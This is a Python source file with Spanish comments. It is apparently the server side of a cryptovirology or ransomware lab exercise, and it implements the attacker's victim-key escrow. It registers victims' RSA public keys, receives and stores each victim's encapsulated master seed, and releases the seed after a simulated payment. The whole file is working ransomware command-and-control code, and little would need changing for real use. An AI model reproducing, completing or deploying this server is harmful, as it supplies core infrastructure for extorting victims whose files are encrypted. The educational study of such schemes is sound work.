
"""
servidor/servidor.py

Rol: servidor Alice del Modelo B.
- Registra la clave pública de cada víctima.
- Recibe y persiste la semilla maestra encapsulada con RSA-OAEP.
- Atiende solicitudes de recuperación por pago simulado.
"""

import sys
import json
import base64
import socket
import os
import tempfile

from pathlib import Path
from threading import Thread, Lock

sys.path.append(str(Path(__file__).resolve().parent.parent))

from comun.transporte import enviar_mensaje, recibir_mensaje
from comun.crypto_common import (
    generar_par_rsa,
    exportar_publica,
    desencapsular_oaep,
    encapsular_oaep,
)

from Crypto.PublicKey import RSA

from comun.firmas import firmar_clave


HOST = "0.0.0.0"
PUERTO = 5000

CARPETA_DATOS = Path(__file__).resolve().parent / "datos"
RUTA_CLAVE_SERVIDOR = CARPETA_DATOS / "clave_servidor.pem"
RUTA_REGISTRO = CARPETA_DATOS / "registro.json"

RUTA_CLAVE_FIRMA_PRIVADA = CARPETA_DATOS / "clave_firma_privada.pem"
RUTA_CLAVE_FIRMA_PUBLICA = CARPETA_DATOS / "clave_firma_publica.pem"

# Protege el registro cuando varias conexiones se atienden simultáneamente.
bloqueo_registro = Lock()


def cargar_o_generar_clave_servidor():
    """Carga la clave del servidor o la genera la primera vez."""
    CARPETA_DATOS.mkdir(parents=True, exist_ok=True)

    if RUTA_CLAVE_SERVIDOR.exists():
        clave_privada = RSA.import_key(RUTA_CLAVE_SERVIDOR.read_bytes())

        if not clave_privada.has_private():
            raise ValueError("El archivo de clave del servidor no contiene una clave privada.")

        print("Clave RSA del servidor cargada.")
    else:
        clave_privada, _ = generar_par_rsa(2048)

        # Escritura inicial del archivo de clave.
        with open(RUTA_CLAVE_SERVIDOR, "xb") as archivo:
            archivo.write(clave_privada.export_key())

        try:
            os.chmod(RUTA_CLAVE_SERVIDOR, 0o600)
        except OSError:
            # Los permisos POSIX pueden no aplicarse en Windows.
            pass

        print("Clave RSA del servidor generada y guardada.")

    if clave_privada.size_in_bits() < 2048:
        raise ValueError("La clave RSA del servidor debe tener al menos 2048 bits.")

    return clave_privada, clave_privada.publickey()



def cargar_o_generar_clave_firma():
    """Carga o genera la clave RSA independiente para firmar."""
    CARPETA_DATOS.mkdir(parents=True, exist_ok=True)

    if RUTA_CLAVE_FIRMA_PRIVADA.exists():
        privada = RSA.import_key(RUTA_CLAVE_FIRMA_PRIVADA.read_bytes())

        if not privada.has_private():
            raise ValueError(
                "La clave de firma almacenada no es una clave privada."
            )

        if privada.size_in_bits() < 2048:
            raise ValueError("La clave de firma debe tener al menos 2048 bits.")

        publica = privada.publickey()

        # Comprobar que la clave pública persistida corresponde a la privada.
        if RUTA_CLAVE_FIRMA_PUBLICA.exists():
            publica_guardada = RSA.import_key(
                RUTA_CLAVE_FIRMA_PUBLICA.read_bytes()
            )
            if (
                publica_guardada.n != publica.n
                or publica_guardada.e != publica.e
            ):
                raise ValueError(
                    "La clave pública de firma no coincide con la privada."
                )
        else:
            RUTA_CLAVE_FIRMA_PUBLICA.write_bytes(publica.export_key())

        print("Clave RSA de firma cargada.")
        return privada, publica

    if RUTA_CLAVE_FIRMA_PUBLICA.exists():
        raise ValueError(
            "Existe una clave pública de firma, pero falta la privada. "
            "No se generará automáticamente otra identidad."
        )

    privada, publica = generar_par_rsa(2048)

    # Crear la privada sin sobrescribir una clave existente.
    with open(RUTA_CLAVE_FIRMA_PRIVADA, "xb") as archivo:
        archivo.write(privada.export_key())

    try:
        os.chmod(RUTA_CLAVE_FIRMA_PRIVADA, 0o600)
    except OSError:
        pass

    RUTA_CLAVE_FIRMA_PUBLICA.write_bytes(publica.export_key())

    print("Clave RSA de firma generada y guardada.")
    return privada, publica



def cargar_registro():
    """Carga el registro persistente o devuelve uno vacío."""
    if not RUTA_REGISTRO.exists():
        return {}

    try:
        registro = json.loads(RUTA_REGISTRO.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError) as error:
        raise RuntimeError(
            f"No se pudo cargar el registro {RUTA_REGISTRO}: {error}"
        ) from error

    if not isinstance(registro, dict):
        raise ValueError("El registro persistente debe ser un objeto JSON.")

    return registro


def guardar_registro(registro):
    """Guarda el registro mediante un archivo temporal y reemplazo."""
    CARPETA_DATOS.mkdir(parents=True, exist_ok=True)
    ruta_temporal = None

    try:
        with tempfile.NamedTemporaryFile(
            mode="w",
            encoding="utf-8",
            dir=CARPETA_DATOS,
            suffix=".tmp",
            delete=False,
        ) as archivo:
            ruta_temporal = Path(archivo.name)
            json.dump(registro, archivo, indent=2)
            archivo.write("\n")
            archivo.flush()
            os.fsync(archivo.fileno())

        os.replace(ruta_temporal, RUTA_REGISTRO)

    finally:
        if ruta_temporal is not None and ruta_temporal.exists():
            ruta_temporal.unlink()


def campo_texto(mensaje, nombre, maximo=256):
    """Obtiene y valida un campo de texto no vacío."""
    valor = mensaje.get(nombre)

    if not isinstance(valor, str) or not valor or len(valor) > maximo:
        raise ValueError(f"El campo '{nombre}' es inválido.")

    return valor


def validar_clave_publica(n, e):
    """Valida los parámetros públicos RSA recibidos."""
    try:
        n = int(n)
        e = int(e)
        clave = RSA.construct((n, e))
    except (ValueError, TypeError, ArithmeticError) as error:
        raise ValueError("La clave pública RSA recibida no es válida.") from error

    if clave.size_in_bits() < 2048:
        raise ValueError("La clave pública RSA debe tener al menos 2048 bits.")

    return clave



def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_privada_firma):
    """Registra una víctima y entrega la clave del servidor firmada."""
    try:
        id_victima = campo_texto(mensaje, "idV")
        clave_victima = validar_clave_publica(
            mensaje.get("pkv_n"),
            mensaje.get("pkv_e"),
        )
    except (ValueError, TypeError) as error:
        enviar_mensaje(conexion, {
            "tipo": "error",
            "detalle": str(error),
        })
        return

    with bloqueo_registro:
        existente = registro.get(id_victima)

        if existente is not None:
            misma_clave = (
                existente.get("pkv_n") == str(clave_victima.n)
                and existente.get("pkv_e") == clave_victima.e
            )

            if not misma_clave:
                enviar_mensaje(conexion, {
                    "tipo": "error",
                    "detalle": "El ID ya está registrado con otra clave pública.",
                })
                return

            print(f"Víctima ya registrada: {id_victima}")
        else:
            registro[id_victima] = {
                "pkv_n": str(clave_victima.n),
                "pkv_e": clave_victima.e,
                "sV_hex": None,
                "pagado": False,
            }

            try:
                guardar_registro(registro)
            except OSError as error:
                del registro[id_victima]
                enviar_mensaje(conexion, {
                    "tipo": "error",
                    "detalle": f"No se pudo guardar el registro: {error}",
                })
                return

            print(f"Víctima registrada: {id_victima}")

    clave_servidor = validar_clave_publica(
        pk_servidor_exportada["n"],
        pk_servidor_exportada["e"],
    )

    firma_servidor = firmar_clave(
        clave_privada_firma,
        "servidor",
        id_victima,
        clave_servidor,
    )

    enviar_mensaje(conexion, {
        "tipo": "registro_ok",
        "pks_n": pk_servidor_exportada["n"],
        "pks_e": pk_servidor_exportada["e"],
        "pks_firma": firma_servidor,
    })

def manejar_entrega_semilla(
    conexion,
    mensaje,
    clave_privada_servidor,
    registro,
):
    """Recibe una semilla encapsulada y la guarda una sola vez."""
    try:
        id_victima = campo_texto(mensaje, "idV")
        encapsulacion_b64 = campo_texto(
            mensaje,
            "encapsulacion_b64",
            maximo=10000,
        )
        encapsulacion = base64.b64decode(
            encapsulacion_b64,
            validate=True,
        )
    except (ValueError, TypeError) as error:
        enviar_mensaje(conexion, {
            "tipo": "error",
            "detalle": f"Mensaje de entrega inválido: {error}",
        })
        return

    with bloqueo_registro:
        entrada = registro.get(id_victima)

        if entrada is None:
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": "Víctima no registrada.",
            })
            return

        # Evita que una nueva entrega reemplace la semilla original.
        if entrada.get("sV_hex") is not None:
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": "La semilla de esta víctima ya fue registrada.",
            })
            return

    try:
        semilla = desencapsular_oaep(
            clave_privada_servidor,
            encapsulacion,
        )
    except (ValueError, TypeError) as error:
        enviar_mensaje(conexion, {
            "tipo": "error",
            "detalle": f"No se pudo desencapsular la semilla: {error}",
        })
        return

    with bloqueo_registro:
        entrada = registro.get(id_victima)

        # Segunda comprobación para evitar carreras entre conexiones.
        if entrada is None or entrada.get("sV_hex") is not None:
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": "La semilla ya fue registrada o la víctima no existe.",
            })
            return

        entrada["sV_hex"] = semilla.hex()

        try:
            guardar_registro(registro)
        except OSError as error:
            entrada["sV_hex"] = None
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": f"No se pudo persistir la semilla: {error}",
            })
            return

    print(f"Semilla maestra recibida y guardada para: {id_victima}")

    enviar_mensaje(conexion, {
        "tipo": "entrega_ok",
        "idV": id_victima,
    })


def manejar_recuperacion_pago(conexion, mensaje, registro):
    """Simula el pago y devuelve la semilla encapsulada para la víctima."""
    try:
        id_victima = campo_texto(mensaje, "idV")
    except ValueError as error:
        enviar_mensaje(conexion, {
            "tipo": "error",
            "detalle": str(error),
        })
        return

    with bloqueo_registro:
        entrada = registro.get(id_victima)

        if entrada is None or entrada.get("sV_hex") is None:
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": "No hay semilla registrada para esa víctima.",
            })
            return

        try:
            clave_victima = validar_clave_publica(
                entrada["pkv_n"],
                entrada["pkv_e"],
            )
            semilla = bytes.fromhex(entrada["sV_hex"])

            if len(semilla) != 32:
                raise ValueError("La semilla persistida tiene una longitud inválida.")

            estado_anterior = entrada.get("pagado", False)
            entrada["pagado"] = True

            try:
                guardar_registro(registro)
            except OSError:
                entrada["pagado"] = estado_anterior
                raise

        except (ValueError, TypeError, KeyError, OSError) as error:
            enviar_mensaje(conexion, {
                "tipo": "error",
                "detalle": f"No se pudo procesar la recuperación: {error}",
            })
            return

    try:
        encapsulacion = encapsular_oaep(clave_victima, semilla)
    except (ValueError, TypeError) as error:
        enviar_mensaje(conexion, {
            "tipo": "error",
            "detalle": f"No se pudo encapsular la semilla: {error}",
        })
        return

    print(f"Recuperación por pago simulado para: {id_victima}")

    enviar_mensaje(conexion, {
        "tipo": "recuperacion",
        "idV": id_victima,
        "encapsulacion_b64": base64.b64encode(
            encapsulacion
        ).decode("ascii"),
    })


def atender_conexion(
    conexion,
    clave_privada_servidor,
    registro,
    pk_servidor_exportada,
    clave_privada_firma,
):
    """Procesa los mensajes de una conexión hasta que se cierre."""
    with conexion:
        while True:
            try:
                mensaje = recibir_mensaje(conexion)

                if mensaje is None:
                    return

                if not isinstance(mensaje, dict):
                    enviar_mensaje(conexion, {
                        "tipo": "error",
                        "detalle": "El mensaje debe ser un objeto JSON.",
                    })
                    continue

                tipo = mensaje.get("tipo")

                if tipo == "registro":
                    manejar_registro(
                        conexion,
                        mensaje,
                        registro,
                        pk_servidor_exportada,
                        clave_privada_firma
                    )

                elif tipo == "entrega_semilla":
                    manejar_entrega_semilla(
                        conexion,
                        mensaje,
                        clave_privada_servidor,
                        registro,
                    )

                elif tipo == "recuperar_pago":
                    manejar_recuperacion_pago(
                        conexion,
                        mensaje,
                        registro,
                    )

                else:
                    enviar_mensaje(conexion, {
                        "tipo": "error",
                        "detalle": "Tipo de mensaje no reconocido.",
                    })

            except (
                ConnectionError,
                OSError,
                ValueError,
                TypeError,
                json.JSONDecodeError,
            ) as error:
                print(f"Conexión cerrada por error: {error}")
                return


def main():
    clave_privada_servidor, clave_publica_servidor = (
        cargar_o_generar_clave_servidor()
    )
    clave_privada_firma, clave_publica_firma = (
        cargar_o_generar_clave_firma()
    )
    pk_servidor_exportada = exportar_publica(clave_publica_servidor)
    registro = cargar_registro()

    escucha = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escucha.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escucha.bind((HOST, PUERTO))
    escucha.listen()

    print(f"Servidor escuchando en {HOST}:{PUERTO}")

    try:
        while True:
            conexion, direccion = escucha.accept()
            print("Conexión aceptada de:", direccion)

            hilo = Thread(
                target=atender_conexion,
                args=(
                    conexion,
                    clave_privada_servidor,
                    registro,
                    pk_servidor_exportada,
                    clave_privada_firma,
                ),
                daemon=True,
            )
            hilo.start()

    except KeyboardInterrupt:
        print("\nServidor detenido.")

    finally:
        escucha.close()


if __name__ == "__main__":
    main()
